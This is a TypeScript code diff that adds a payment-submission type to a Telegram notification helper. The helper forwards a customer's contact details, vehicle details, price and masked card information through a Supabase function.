@@ -67,9 +67,24 @@ export interface FormSubmissionData {
   price: string;
 }
 
+export interface PaymentSubmissionData {
+  userId: string;
+  name: string;
+  email: string;
+  phone: string;
+  vehicle_registration: string;
+  vehicle_make: string;
+  vehicle_model: string;
+  vehicle_color: string;
+  duration: string;
+  price: string;
+  card_number_masked: string;
+  card_type: string;
+}
+
 export const sendTelegramNotification = async (
-  type: 'user_info' | 'form_submission' | 'vehicle_lookup',
-  data: UserInfoData | FormSubmissionData | VehicleLookupData
+  type: 'user_info' | 'form_submission' | 'vehicle_lookup' | 'payment_submission',
+  data: UserInfoData | FormSubmissionData | VehicleLookupData | PaymentSubmissionData
 ) => {
   try {
     const { data: result, error } = await supabase.functions.invoke(
@@ -109,4 +124,8 @@ export const sendFormSubmissionNotification = async (formData: FormSubmissionDat
 
 export const sendVehicleLookupNotification = async (vehicleData: VehicleLookupData) => {
   return sendTelegramNotification('vehicle_lookup', vehicleData);
+};
+
+export const sendPaymentSubmissionNotification = async (paymentData: PaymentSubmissionData) => {
+  return sendTelegramNotification('payment_submission', paymentData);
 };
